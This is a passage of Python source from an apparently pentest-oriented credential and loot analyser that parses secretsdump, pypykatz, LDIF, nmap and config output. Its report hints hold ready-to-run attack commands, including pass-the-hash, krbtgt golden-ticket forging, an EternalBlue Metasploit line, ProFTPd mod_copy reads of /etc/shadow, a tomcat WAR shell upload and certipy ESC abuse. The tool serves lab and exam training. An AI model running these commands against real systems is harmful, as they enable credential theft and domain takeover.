                                  m.group(3).strip(), m.group(4).strip())
        key = (kb, cve)
        if key in vuln_seen:
            continue
        vuln_seen.add(key)
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"missing patch: {title} ({kb}, {cve}) — {status}",
                   hint=("verify on host: systeminfo | findstr KB ; "
                         f"local public PoC search by CVE id (manual on Kali): searchsploit {cve}"))
    for m in _PE_JSON_VULN.finditer(text):
        kb, cve = m.group(1).strip(), m.group(2).strip()
        key = (kb, cve)
        if key in vuln_seen:
            continue
        vuln_seen.add(key)
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"PrivescCheck missing patch: {kb} ({cve})",
                   hint=f"verify on host: systeminfo | findstr KB ; manual PoC search: searchsploit {cve}")

    # iter-12 composite: Terraform state "sensitive": true paired with the
    # SAME block's "value": "<secret>". JSON ordering may put either field
    # first. Iterate top-level output keys + check whether the block carries
    # both `"sensitive": true` AND a `"value": "..."`, treating that as a
    # validated pair within ONE block.
    # Inner leaf block: braces don't nest (no `{` inside `body`).
    _TF_BLOCK = re.compile(
        r'"([\w-]{1,80})"\s*:\s*\{([^{}]{1,600})\}', re.MULTILINE)
    plow_tf = path.lower()
    if plow_tf.endswith((".tfstate", ".tfstate.backup", ".tfplan")):
        tfs_seen = set()
        for m in _TF_BLOCK.finditer(text):
            var, block = m.group(1), m.group(2)
            if '"sensitive"' not in block or '"value"' not in block:
                continue
            if not re.search(r'"sensitive"\s*:\s*true', block):
                continue
            vm = re.search(r'"value"\s*:\s*"([^"]{3,200})"', block)
            if not vm:
                continue
            val = vm.group(1)
            if filters.is_placeholder(val) or filters.is_known_example(val):
                continue
            if val in tfs_seen:
                continue
            tfs_seen.add(val)
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"tfstate sensitive {var}: {val}",
                       hint=f"terraform output {var}; reuse against the provisioned resource")
            if store is not None:
                store.add(Evidence(kind="plaintext", plaintext=val,
                                   source=path, line=_ln(m)))

    # iter-21: LDAP description / info / comment / userPassword cleartext.
    # Common AD trick (HTB Forest, Cascade, Resolute, Sauna; PG Practice
    # writeups) — sysadmin embeds passwords in plain LDAP attributes.
    # We ONLY fire inside an LDIF block (a `dn:` marker within ~30 prior
    # lines) so we don't FP on prose / log files / config XMLs.
    _LDIF_ATTR_PW = re.compile(
        r'(?im)^(description|info|comment|userPassword|userParameters|'
        r'pwdLastSet|pwdHistory)\s*::?\s*(.{6,200})$')
    _LDIF_DN_MARKER = re.compile(r'(?im)^dn\s*:', re.MULTILINE)
    plow_ldif = path.lower()
    is_ldif_path = (plow_ldif.endswith((".ldif", ".ldap", ".ldp", ".bh.json"))
                    or "bloodhound" in plow_ldif
                    or "ldapdomaindump" in plow_ldif
                    or "ldapsearch" in plow_ldif)
    if (is_ldif_path or _LDIF_DN_MARKER.search(text)) and not filters.is_doc_file(path):
        # Extract candidate password TOKENS from a prose value (HTB Forest:
        # `description: Account created. Password is Tempo2024!`). The full
        # value may be sentence-shaped; the actual cred sits as a single
        # token that mixes upper + digit + symbol.
        _PWTOK = re.compile(r'\b([A-Za-z]\S*\d\S*|\S*\d\S*[A-Z]\S*)[!@#$%^&*+=\-_]\S*\b')
        for m in _LDIF_ATTR_PW.finditer(text):
            attr, raw = m.group(1).lower(), m.group(2).strip()
            if filters.is_placeholder(raw) or filters.is_known_example(raw):
                continue
            # userPassword / userParameters: explicit cred field - the whole
            # value IS the cred. Otherwise we extract candidate tokens.
            candidates = []
            if attr in ("userpassword", "userparameters"):
                candidates = [raw]
            else:
                # try the whole value first if it's compact enough
                if (len(raw) <= 60 and " " not in raw
                        and any(c.isdigit() for c in raw)
                        and any(c.isupper() for c in raw)):
                    candidates.append(raw)
                # always also extract substring tokens from prose
                for tm in _PWTOK.finditer(raw):
                    candidates.append(tm.group(1) + tm.group(0)[len(tm.group(1)):])
                # fall back to splitting on whitespace + filtering tokens
                for tok in raw.split():
                    if (8 <= len(tok) <= 40
                            and any(c.isdigit() for c in tok)
                            and any(c.isupper() for c in tok)
                            and any(c in "!@#$%^&*+=-_" for c in tok)):
                        candidates.append(tok.rstrip(".,;:!?)"))
            seen_cand = set()
            for cand in candidates:
                cand = cand.strip("'\"`.,;:")
                if not cand or cand in seen_cand:
                    continue
                seen_cand.add(cand)
                if filters.is_placeholder(cand) or len(cand) < 6:
                    continue
                # principal via the most-recent preceding dn:
                ctx = text[max(0, m.start() - 1500):m.start()]
                principal = "?"
                for dnm in re.finditer(r'(?im)^dn\s*:\s*([^\r\n]+)', ctx):
                    cn = re.search(r'(?i)CN=([^,]+)', dnm.group(1))
                    if cn:
                        principal = cn.group(1).strip()
                sev = "CRITICAL" if attr == "userpassword" else "HIGH"
                report.add(sev, "CRED PAIRS", path, _ln(m),
                           f"LDAP {attr} on {principal}: {cand}",
                           hint=(f"AD trick - admin embedded a cred in the {attr} attribute. "
                                 f"reuse: nxc smb <dc> -u '{principal}' -p '{cand}'"))
                if store is not None:
                    store.add(Evidence(kind="plaintext", user=principal, plaintext=cand,
                                       source=path, line=_ln(m)))
                break  # one cred per attr line

    # iter-117: LSA DPAPI_SYSTEM secret block emitted by impacket-secretsdump
    # every time the SECURITY hive is decrypted. Format:
    #   [*] DPAPI_SYSTEM
    #   dpapi_machinekey:0x{40hex}
    #   dpapi_userkey:0x{40hex}
    # dpapi_machinekey unwraps SYSTEM-scope DPAPI masterkeys (services, IIS
    # applicationhost, Scheduled Tasks). dpapi_userkey unwraps user-scope MKs
    # when the user's plaintext is unknown. Emit them as dpapi_mk Evidence
    # tagged with 'system=True' so R-DPAPI can pair with any Credentials\ blob
    # even without a per-user masterkey file.
    _LSA_DPAPI_SYSTEM = re.compile(
        r'(?im)^\s*\[\*\]\s*DPAPI_SYSTEM\s*\r?\n'
        r'\s*dpapi_machinekey\s*:\s*0x([0-9a-f]{40})\s*\r?\n'
        r'\s*dpapi_userkey\s*:\s*0x([0-9a-f]{40})\s*$')
    for m in _LSA_DPAPI_SYSTEM.finditer(text):
        if filters.is_doc_file(path):
            continue
        mk_key, uk_key = m.group(1), m.group(2)
        if filters.is_canonical_sample(mk_key):
            continue
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"LSA DPAPI_SYSTEM: machinekey=0x{mk_key[:16]}... "
                   f"userkey=0x{uk_key[:16]}...",
                   hint=(f"impacket-dpapi masterkey -file <mk-blob> "
                         f"-system {mk_key}  # unwrap SYSTEM DPAPI MK; then "
                         f"impacket-dpapi credential -file <cred> -key 0x<sha1>"))
        if store is not None:
            store.add(Evidence(kind="dpapi_mk", source=path, line=_ln(m),
                               meta={"sha1": mk_key, "system": True,
                                     "userkey": uk_key}))

    # iter-18: LSA secret `[*] _SC_<service>` cleartext service-account password
    # (impacket secretsdump.py LSASecrets output)
    _LSA_SC = re.compile(
        r'(?im)^\s*\[\*\]\s*_SC_(\S+)\s*\r?\n'
        r'\s*(?:\(Unknown User\)|([^\s:\\]+(?:\\[^\s:\\]+)?)):([^\r\n]{3,200})\s*$')
    for m in _LSA_SC.finditer(text):
        if filters.is_doc_file(path):
            continue
        svc = m.group(1).strip()
        user = (m.group(2) or "").strip()
        pw = m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        principal = user or f"({svc} service)"
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"LSA _SC_{svc} service account: {principal}:{pw}",
                   hint=(f"impacket LSA secret - PLAINTEXT password of the {svc} service account; "
                         f"silver-ticket/lateral primitive: "
                         f"nxc smb <host> -u '{user or svc}' -p '{pw}'"))
        if store is not None:
            store.add(Evidence(kind="plaintext", user=user, plaintext=pw,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz MSV block (Linux/cross-platform mimikatz alternative)
    _PYPYKATZ_MSV = re.compile(
        r'(?i)==\s*MSV\s*==[\s\S]{0,400}?Username\s*:\s*(\S{1,40})\s*\n'
        r'[\s\S]{0,200}?Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,400}?'
        r'\bNT\s*:\s*([a-f0-9]{32})\b'
        r'(?:[\s\S]{0,300}?\bDPAPI\s*:\s*([a-f0-9]{32})\b)?')
    _PYPYKATZ_BLEED = re.compile(r'(?i)==\s*(?:MSV|WDIGEST|Kerberos|SSP|LiveSSP|TsPkg|DPAPI|CredentialKeys)\s*[=\[]')
    for m in _PYPYKATZ_MSV.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, nt = m.group(1), m.group(2), m.group(3)
        dpapi = m.group(4)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"pypykatz NT {dom}\\{u}: {nt}",
                   hint=f"PtH: nxc smb <host> -d {dom} -u {u} -H {nt} | crack: hashcat -m 1000 <nt> rockyou.txt")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))
        if store is not None:
            store.add(Evidence(kind="hash", user=u, hash=nt, hash_mode="1000",
                               domain=dom, source=path, line=_ln(m)))
        if dpapi and not filters.is_canonical_sample(dpapi):
            report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                       f"pypykatz DPAPI user-key {dom}\\{u}: {dpapi}",
                       hint=f"impacket-dpapi credential -key {dpapi} <CredFile>  - skips masterkey cracking")
            if store is not None:
                store.add(Evidence(kind="dpapi_key", user=u, plaintext=dpapi,
                                   domain=dom, source=path, line=_ln(m)))

    # iter-18: pypykatz WDIGEST cleartext block
    _PYPYKATZ_WDIGEST = re.compile(
        r'(?i)==\s*WDIGEST\s*\[[0-9a-f]{4,}\]==\s*\n'
        r'\s*username\s+(\S{1,40})\s*\n'
        r'\s*domainname\s+(\S{1,40})\s*\n'
        r'\s*password\s+(?!\(null\)|None\b)([^\r\n]{3,80})\s*\n'
        r'\s*password\s*\(hex\)')
    for m in _PYPYKATZ_WDIGEST.finditer(text):
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz wdigest cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u {u} -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz Kerberos cleartext block (separate from the aes-key
    # single-line rule which is dispatched in _AD).
    _PYPYKATZ_KERB = re.compile(
        r'(?is)==\s*Kerberos\s*==[\s\S]{0,400}?Username\s*:\s*(\S{1,40})'
        r'[\s\S]{0,200}?Domain\s*:\s*(\S{1,80})'
        r'[\s\S]{0,200}?Password\s*:\s*(?!\(null\)|None|n/a|\s*$)([^\r\n]{3,80})')
    for m in _PYPYKATZ_KERB.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz Kerberos cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u {u} -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: pypykatz DPAPI masterkey block (sha1_masterkey for impacket-dpapi)
    _PYPYKATZ_DPAPI_MK = re.compile(
        r'(?im)^[ \t]*key_guid[ \t]+\{([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-'
        r'[0-9a-f]{4}-[0-9a-f]{12})\}[\s\S]{0,400}?'
        r'^[ \t]*sha1_masterkey[ \t]+([0-9a-f]{40})\b')
    for m in _PYPYKATZ_DPAPI_MK.finditer(text):
        if filters.is_doc_file(path):
            continue
        guid, sha1 = m.group(1), m.group(2)
        if filters.is_canonical_sample(sha1):
            continue
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"DPAPI masterkey (pypykatz): {{{guid}}} sha1={sha1}",
                   hint=f"dpapi.py credential -key 0x{sha1} <blob>  - decrypts Chrome/RDP/Vault/PFX bound to this GUID")
        # iter-24: store the masterkey sha1 + GUID so the chain engine can
        # pair it with any Credential blob the same scan emits.
        if store is not None:
            store.add(Evidence(kind="dpapi_mk", source=path, line=_ln(m),
                               meta={"guid": guid, "sha1": sha1}))

    # iter-18: pypykatz SSP / LiveSSP / TsPkg / CredentialKeys block
    _PYPYKATZ_SSP = re.compile(
        r'(?im)^==\s*(?:SSP|LiveSSP|TsPkg|CredentialKeys|MSV|WDIGEST|Kerberos)\s*'
        r'(?:\[[0-9a-f]+\])?\s*==\s*$'
        r'[\s\S]{0,400}?^\s*username\s+(\S{1,80})\s*$'
        r'[\s\S]{0,400}?^\s*domainname\s+(\S{1,80})\s*$'
        r'[\s\S]{0,400}?^\s*password\s+(?!\(hex\))(?!\(null\))([^\r\n]{3,200})\s*$')
    for m in _PYPYKATZ_SSP.finditer(text):
        if not _no_bleed(m, 1, 3, _PYPYKATZ_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pypykatz SSP cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u {u} -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom,
                               source=path, line=_ln(m)))

    # iter-18: impacket dpapi.py [CREDENTIAL] block (cleartext under "Unknown:" field)
    _IMPACKET_DPAPI_CRED = re.compile(
        r'(?is)\[CREDENTIAL\][\s\S]{0,400}?'
        r'Target\s*:\s*([^\r\n]{3,120})[\s\S]{0,400}?'
        r'Username\s*:\s*([^\r\n]{1,80})[\s\S]{0,200}?'
        r'Unknown\s*:\s*(?!\s*$)([^\r\n]{3,200})')
    _IMP_CRED_BLEED = re.compile(r'\[CREDENTIAL\]')
    for m in _IMPACKET_DPAPI_CRED.finditer(text):
        if filters.is_doc_file(path):
            continue
        if not _no_bleed(m, 1, 3, _IMP_CRED_BLEED):
            continue
        target, u, pw = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        if filters.is_placeholder(pw):
            continue
        # strip 'Domain:target=' / 'LegacyGeneric:target=' prefix
        target = re.sub(r'^(?:Domain|LegacyGeneric):target=', '', target)
        # reject when pw is pure hex (blob, not cleartext)
        if re.match(r'^[0-9a-fA-F]{16,}$', pw):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"DPAPI Credential Manager {target}: {u}:{pw}",
                   hint=f"plaintext from impacket-dpapi; reuse: nxc smb/mssql/winrm -u '{u}' -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                               source=path, line=_ln(m)))

    # iter-17 (corpus mine wkl2kkzn5): nmap NSE smb-vuln-* output block
    # (HTB Blue / TryHackMe Blue EternalBlue). The script header + multi-line
    # body + State:VULNERABLE need file-scope context.
    if not filters.is_doc_file(path):
        _NMAP_SMB_VULN = re.compile(
            r'(?im)\|\s*(smb2?-vuln-[a-z0-9\-]+)\s*:[^\r\n]*\r?\n'
            r'(?:\|[^\r\n]*\r?\n){0,15}?\|[^\r\n]*\bState\s*:\s*VULNERABLE\b')
        for m in _NMAP_SMB_VULN.finditer(text):
            script_id = m.group(1)
            report.add("CRITICAL", "RECON", path, _ln(m),
                       f"nmap {script_id}: VULNERABLE",
                       hint=("OSCP+ allows manual single-target Metasploit: "
                             "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
                             "set RHOSTS <ip>; set LHOST <you>; run'  OR  public PoC: "
                             "worawit/MS17-010 send_and_execute.py <ip> <smbexe>"))

        # iter-17: ProFTPd mod_copy CPFR/CPTO (CVE-2015-3306, HTB Kenobi)
        _PROFTPD = re.compile(
            r'(?im)^\s*(?:ftp>\s+)?SITE\s+CPFR\s+(/\S+)[\s\S]{0,400}?'
            r'^\s*(?:ftp>\s+)?SITE\s+CPTO\s+(/\S+)')
        for m in _PROFTPD.finditer(text):
            src_p, dst_p = m.group(1), m.group(2)
            report.add("CRITICAL", "INTERESTING FILES", path, _ln(m),
                       f"ProFTPd mod_copy: CPFR {src_p} -> CPTO {dst_p}",
                       hint=("CVE-2015-3306 pre-auth arb-file-read: "
                             "curl -s ftp://anonymous@<ip>/ --quote 'SITE CPFR /etc/shadow' "
                             "--quote 'SITE CPTO /var/tmp/x'; then GET /var/tmp/x via FTP/HTTP"))

    # iter-11: Pidgin accounts.xml plaintext password block (multi-line XML)
    _PIDGIN = re.compile(
        r'(?is)<account>\s*<protocol>([a-z\-]{3,30})</protocol>\s*'
        r'<name>([^<\r\n]{1,120})</name>\s*<password>([^<\r\n]{3,120})</password>')
    for m in _PIDGIN.finditer(text):
        proto, u, p = m.group(1), m.group(2), m.group(3)
        if filters.is_placeholder(p):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"pidgin {proto}: {u}:{p}",
                   hint=f"plaintext IM cred; this acct often shares pw with the host or domain account")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                               source=path, line=_ln(m)))


def analyze(path, report, store=None):
    ext = os.path.splitext(path)[1].lower()
    require_quote = ext in _CODE_EXT
    seen_svc = set()
    try:
        with open(path, "r", errors="ignore") as f:
            for lineno, line in enumerate(f, 1):
                line = line.rstrip("\n")
                if SKIP_LINE.match(line):
                    continue

                # ---- pass 0: learn netexec/cme service lines (no claim) ----
                if store is not None and _NXC_SVC.match(line):
                    _learn_nxc_service(line, path, store, seen_svc)
                    # fall through: credline may still pull a cred off this line

                # ---- pass 1: the credential-line classifier ----
                c = credline.classify(line)
                if c and c.kind in ("cred", "failed"):
                    who = (c.user or "<user>")
                    tag = " (FAILED auth)" if c.kind == "failed" else ""
                    sev = "HIGH" if c.kind == "failed" else "CRITICAL"
                    label = (f"{c.note}: {c.password}" if c.note == "PowerShell SecureString"
                             else f"{who}:{c.password}{tag}")
                    # iter-141: shell-safe escape for pw hint (may carry ')
                    _pw_sh = (c.password or "").replace("'", "'\\''")
                    report.add(sev, "CRED PAIRS", path, lineno, label,
                               f"netexec smb <DC-IP> -u '{who}' -p '{_pw_sh}' -k")
                    if store is not None:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="plaintext", user=c.user,
                                           plaintext=c.password, domain=c.domain,
                                           source=path, line=lineno))
                    continue
                if c and c.kind == "pwdump":
                    # iter-13: feed the user<->NT binding into the Evidence
                    # store so the R7 chain engine sees it.
                    if store is not None and c.nt_hash:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="hash", user=c.user,
                                           hash=c.nt_hash, hash_mode="1000",
                                           domain=c.domain,
                                           source=path, line=lineno))
                        # iter-35: krbtgt = golden-ticket primitive. Emit a
                        # CRITICAL flag + separate kind='krbtgt' Evidence so
                        # correlate.py R-GOLDEN routes off it.
                        if c.user.lower() == "krbtgt":
                            report.add("CRITICAL", "PASSWORD HASHES",
                                       path, lineno,
                                       f"krbtgt NT hash: {c.nt_hash}",
                                       hint=("golden ticket primitive - forge "
                                             "any user (Administrator): "
                                             "impacket-ticketer -nthash "
                                             f"{c.nt_hash} -domain-sid "
                                             "<S-1-5-21-...> -domain "
                                             f"{c.domain or '<DOM>'} "
                                             "Administrator; export "
                                             "KRB5CCNAME=Administrator.ccache; "
                                             "impacket-secretsdump -k -no-pass "
                                             "'<DOM>/Administrator@<DC-FQDN>'"))
                            store.add(Evidence(kind="krbtgt", user="krbtgt",
                                               hash=c.nt_hash,
                                               domain=c.domain,
                                               source=path, line=lineno))
                    continue

                # ---- pass 2: inline-cred shapes ----
                hit = False
                # iter-7 (round 2): doc files (hardening guides, cheatsheets)
                # teach AutoLogon REG_SZ syntax and show 'Strong Passwords'
                # examples - skip all the inline-cred patterns here.
                _is_doc = filters.is_doc_file(path)
                for name, rx in _AD:
                    am = rx.search(line)
                    if not am:
                        continue
                    # autologon password in doc files is teaching content, not loot.
                    if _is_doc and name in ("autologon password",
                                            "SQL IDENTIFIED BY",
                                            "sshpass -p",
                                            "mysql -p inline",
                                            # iter-9: doc-file skips
                                            "Ansible Vault header",
                                            "PowerShell -enc payload",
                                            "GPP cpassword inline",
                                            "browser password CSV"):
                        continue
                    # iter-11 FP audit: MongoDB BSON shell output has TWO groups
                    # (user, pass) but no dedicated dispatch branch existed -
                    # the generic fallthrough only emitted group(1) (user) as
                    # ASSIGNED SECRETS, losing the pw value. Fix: split here.
                    if name == "MongoDB BSON":
                        u, p = am.group(1), am.group(2)
                        if not p or filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"MongoDB user: {u}:{p}",
                                   hint=f"mongosh 'mongodb://{u}:{p}@<host>:27017/'  - admin role allows db.adminCommand(...)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # tomcat-users: user+pass+roles -> RCE-aware severity
                    if name == "tomcat-users":
                        u, p, roles = am.group(1), am.group(2), (am.group(3) or "")
                        if not p or filters.is_placeholder(p):
                            continue
                        rce = any(r in roles.lower() for r in
                                  ("manager-script", "manager-jmx", "admin-gui", "admin-script"))
                        sev = "CRITICAL" if rce else "HIGH"
                        cat = "CRED PAIRS" if rce else "ASSIGNED SECRETS"
                        hint = (f"tomcat WAR-deploy RCE: curl --upload-file shell.war "
                                f"-u '{u}:{p}' 'http://<host>:8080/manager/text/deploy?path=/shell'"
                                if rce else
                                f"tomcat login: u={u} p={p}; check /manager /host-manager")
                        report.add(sev, cat, path, lineno, f"tomcat user '{u}':{p}" +
                                   (f"  [{roles[:40]}]" if roles else ""), hint=hint)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # FileZilla base64 obfuscation -> decode inline
                    if name == "FileZilla pass":
                        import base64 as _b64
                        try:
                            pw = _b64.b64decode(am.group(1), validate=True).decode("utf-8")
                        except Exception:
                            pw = am.group(1) + " (base64 - decode by hand)"
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"FileZilla saved password: {pw}",
                                   hint="FileZilla base64 obfuscation - reuse directly")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # Jenkins encrypted blob: flag the file (cannot decrypt without
                    # master.key + hudson.util.Secret) and point to the offline chain
                    if name == "Jenkins enc blob":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Jenkins credentials.xml encrypted blob",
                                   hint="offline decrypt: hoto/jenkins-credentials-decryptor -m secrets/master.key "
                                   "-s secrets/hudson.util.Secret -c credentials.xml")
                        hit = True
                        break
                    # Shadow credentials: msDS-KeyCredentialLink write or Certipy
                    # output. Intel-only (the NT hash recovered THROUGH this path
                    # is captured by the 'Certipy got-hash' rule below).
                    if name == "Shadow credentials":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Shadow Credentials marker (msDS-KeyCredentialLink)",
                                   hint="certipy-ad shadow auto -account <target> -u <user>@<dom> -p <pw> "
                                   "-> PKINIT -> NT hash via getnthash / U2U")
                        hit = True
                        break
                    # Certipy 'Got hash for X: LM:NT' -> CRITICAL user-bound NT hash
                    if name == "Certipy got-hash":
                        user, lm, nt = am.group(1), (am.group(2) or ""), am.group(3)
                        if not nt or filters.is_blank_hash(nt):
                            hit = True
                            break
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"NTLM (NT) {user}: {nt}",
                                   hint=f"PtH: netexec smb <DC-IP> -u '{user}' -H {nt}  |  crack: hashcat -m 1000 {nt} rockyou.txt")
                        # also feed the global HASHES list so --hashes file picks it up
                        from analyzers.patterns import HASHES
                        HASHES.append(("1000", "NTLM", nt, path, lineno))
                        hit = True
                        break
                    # LAPS cleartext (ms-Mcs-AdmPwd / Windows-LAPS) -> CRITICAL local admin pw
                    if name in ("LAPS ms-Mcs-AdmPwd", "LAPS v2 cleartext"):
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw) or len(pw) < 6:
                            hit = True
                            break
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"LAPS local admin password: {pw}",
                                   hint="local admin: netexec smb <host> -u Administrator -p '" + pw +
                                   "' --local-auth  | or evil-winrm -i <host> -u Administrator -p '" + pw + "'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user="Administrator",
                                               plaintext=pw, source=path, line=lineno))
                        hit = True
                        break
                    # gMSA blob marker - cannot decode without bloodyAD/gMSADumper auth
                    if name == "gMSA ManagedPassword":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "gMSA msDS-ManagedPassword blob",
                                   hint="gMSADumper.py -u <user> -p <pw> -d <dom> -l <dc>  (RetrievePrincipal right needed)")
                        hit = True
                        break
                    # ---- iter-6 INTEL markers ----
                    # Iter-7: doc/cheatsheet/tutorial files (`pentest-cheatsheet.md`,
                    # `AD-hardening-guide.md`, `bloodhound-acl-edges.md`,
                    # `kerberoasting-explained.txt`) are designed to TEACH these
                    # primitives, so the markers appear in prose constantly. The
                    # operator's loot never lives in those - we suppress intel
                    # detectors on them entirely.
                    if name in ("ADCS ESC", "RBCD marker", "BloodHound ACL edge",
                                "WSUS abuse", "DPAPI masterkey",
                                # iter-11 FP-audit additions (workflow wijdgt0aa)
                                "PEAS finding", "AlwaysInstallElevated",
                                "token impersonation", "Snaffler red",
                                "SUID GTFOBins", "Linux capability",
                                "NFS no_root_squash", "smbmap rw share",
                                "kerbrute valid user", "Helm values secret",
                                "Vault unseal key", "Vault root token",
                                "kubectl --token") and filters.is_doc_file(path):
                        continue
                    # AD CS ESC#: must look like ACTUAL certipy / certify output
                    # ('Vulnerabilities:', '[!] ESC1', 'Template Name :',
                    # 'Certipy v4...', 'EnableTemplate', 'ManageCA :', etc.),
                    # NOT a markdown bullet from a docs cheatsheet ('- ESC1:
                    # enrollee-supplies-subject ...'). Iter-7 FP audit: 11 doc
                    # FPs killed by this stricter gate.
                    if name == "ADCS ESC":
                        is_markdown_bullet = re.match(r'^\s*[-*]\s+ESC\d', line)
                        ctx = re.search(
                            r'(?i)Vulnerabilit(?:y|ies)\s*:|Certipy\s+v\d|certipy-ad|certify\.exe|'
                            r'\[\s*[!+*]\s*\]\s*ESC\d|Template\s+Name\s*:|EnableTemplate|'
                            r'Manage[CC]A\s*:|Manage[Cc]ertificates|ESC\d\s*\(|'
                            r'Enrollee\s+Supplies\s+Subject|Client\s+Authentication\s*:\s*True|'
                            r'Enrollment\s+Rights', line)
                        if is_markdown_bullet or not ctx:
                            continue
                        esc = am.group(0).upper()
                        # iter-21: per-ESC specific exploitation hints
                        # (replaces the generic 'certipy-ad req ...' wording).
                        ESC_HINTS = {
                            "ESC1": ("Enrollee-supplies-subject + Client Auth EKU: "
                                     "certipy-ad req -u <user>@<dom> -p <pw> -ca <CA> "
                                     "-template <T> -upn 'administrator@<dom>'; then "
                                     "certipy-ad auth -pfx <out>.pfx -> NT hash"),
                            "ESC2": ("Any-purpose EKU: certipy-ad req -u <user> -p <pw> "
                                     "-ca <CA> -template <T> -upn 'administrator@<dom>'; "
                                     "auth -pfx -> use cert for arbitrary purposes"),
                            "ESC3": ("Enrollment-agent + restrictions bypass: "
                                     "certipy-ad req -u <user> -p <pw> -ca <CA> "
                                     "-template <T> -on-behalf-of <victim>"),
                            "ESC4": ("Vulnerable template ACL (WriteOwner/WriteDacl etc.): "
                                     "certipy-ad template -u <user> -p <pw> -template <T> "
                                     "-write-default-configuration; then req as ESC1"),
                            "ESC6": ("EDITF_ATTRIBUTESUBJECTALTNAME2 on CA: any cert can "
                                     "be issued with a custom SAN. certipy-ad req with -upn"),
                            "ESC7": ("ManageCA + ManageCertificates rights: "
                                     "certipy-ad ca -u <user> -p <pw> -ca <CA> -enable-template SubCA; "
                                     "then req SubCA -> issue arbitrary cert"),
                            "ESC8": ("[LAB-ONLY] NTLM relay to web-enrollment (certsrv). "
                                     "NOT OSCP+-exam-legal (requires relay/coerced auth). "
                                     "manual chain not viable on exam"),
                            "ESC9": ("NoSecurityExtension on template: certipy-ad req with "
                                     "-upn 'administrator@<dom>' (UPN bypass when "
                                     "msDS-AllowedToActOnBehalfOfOtherIdentity is set)"),
                            "ESC10": ("Weak certificate-mapping (StrongCertificateBindingEnforcement=0 "
                                      "OR CertificateMappingMethods has UPN/SAN): "
                                      "certipy-ad req -upn '<victim>@<dom>'"),
                            "ESC11": ("[LAB-ONLY] IF_ENFORCEENCRYPTICERTREQUEST=0 enables "
                                      "NTLM-relay to ICPR. NOT OSCP+-exam-legal (relay-based). "
                                      "manual chain not viable on exam"),
                            "ESC13": ("msDS-OIDToGroupLink: issuance-policy OID linked to "
                                      "a group. certipy-ad req -template <T> -ca <CA> -u <user>; "
                                      "PKINIT auth grants group-membership PAC without password reset"),
                            "ESC15": ("Schannel + EnrolleeSuppliesSubject + Application-Policies: "
                                      "certipy-ad req -application-policies 'Client Authentication' "
                                      "-template WebServer; auth via Schannel / passthecert.py"),
                            "ESC16": ("Suppressed Security Extension via SubjectAltRequireUpn "
                                      "+ NTAuthCertificates write: certipy-ad req with -upn override; "
                                      "auth as administrator without password reset"),
                        }
